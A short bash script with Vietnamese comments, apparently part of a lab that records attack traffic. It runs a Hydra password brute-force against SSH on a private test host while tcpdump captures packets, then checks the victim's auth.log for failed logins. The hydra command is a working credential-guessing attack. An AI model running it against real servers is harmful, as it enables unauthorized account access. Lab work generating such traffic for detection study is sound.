#!/bin/bash
# Kịch bản 2: Brute-force SSH bằng Hydra

TARGET="172.28.0.10"
IFACE="eth0"
SSH_USER="testuser"
WORDLIST="/root/pass.txt"
AUTH_LOG="../logs/victim/auth.log"

mkdir -p ../pcap
TIME=$(date +%Y%m%d_%H%M%S)
PCAP="../pcap/02_ssh_bruteforce_$TIME.pcap"
OUT="../pcap/02_ssh_bruteforce_$TIME.txt"

echo "Bắt đầu bắt gói tin, lưu vào $PCAP"
tcpdump -i $IFACE host $TARGET and port 22 -w $PCAP &
PID=$!
sleep 2

echo "Chạy hydra dò mật khẩu SSH vào $TARGET"
hydra -l $SSH_USER -P $WORDLIST -t 4 -f $TARGET ssh -o $OUT

sleep 3
kill $PID

echo "Kiểm tra auth.log xem có dòng Failed password không"
if [ -f "$AUTH_LOG" ]; then
    grep "Failed password" $AUTH_LOG
else
    echo "Không thấy file $AUTH_LOG, kiểm tra lại đường dẫn mount volume"
fi

echo "Xong rồi."
